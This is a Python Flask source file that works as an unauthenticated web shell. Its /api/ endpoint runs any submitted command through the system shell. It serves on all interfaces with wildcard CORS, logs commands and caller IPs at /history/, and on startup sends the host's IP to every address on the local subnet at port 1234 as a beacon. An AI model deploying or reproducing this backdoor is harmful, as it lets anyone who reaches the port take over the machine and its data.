from flask import Flask, request
import subprocess
import os
import threading
import socket
app = Flask(__name__)

history = []

@app.route("/api/", methods=["POST"])
def api():
	if request.form.get('command'):
		proc = subprocess.Popen(request.form.get('command'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, bufsize=-1)
		proc.wait()
		str_stdout = proc.stdout.read().decode()
		str_stderr = proc.stderr.read().decode()
		result = {"std":str_stdout, "err":str_stderr, "command": request.form.get('command'), "ip": request.remote_addr}
		history.append(result)
		while(len(history) > 100): history.pop(0)
		return result
	else:
		return ''
		
@app.route("/", methods=["GET"])
def index():
	with open("ww", "w") as f:
		f.write(str(os.listdir()))
	with open("./index.html","r") as f:
		html = f.read()
	return html
	
@app.route("/history/", methods=["GET"])
def his():
	return {"list": history, "ip": request.remote_addr}

@app.after_request
def cors(environ):
    environ.headers['Access-Control-Allow-Origin']='*'
    environ.headers['Access-Control-Allow-Method']='*'
    environ.headers['Access-Control-Allow-Headers']='x-requested-with,content-type'
    return environ

def get_host_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    finally:
        s.close()
        
    return ip

def broadcast():
	ip = get_host_ip()
	qian = ".".join(ip.split(".")[:3]) + "."
	ip = '[' + ip + ']\n'
	for i in range(0, 256):
		nip = qian + str(i)
		try:
			s = socket.socket()
			s.settimeout(0.01)
			s.connect((nip, 1234))
			s.send(ip.encode())
			s.close()
		except:
			pass
 
if __name__ == "__main__":
	threading.Thread(target = broadcast).start()
	app.run("0.0.0.0", 1235)
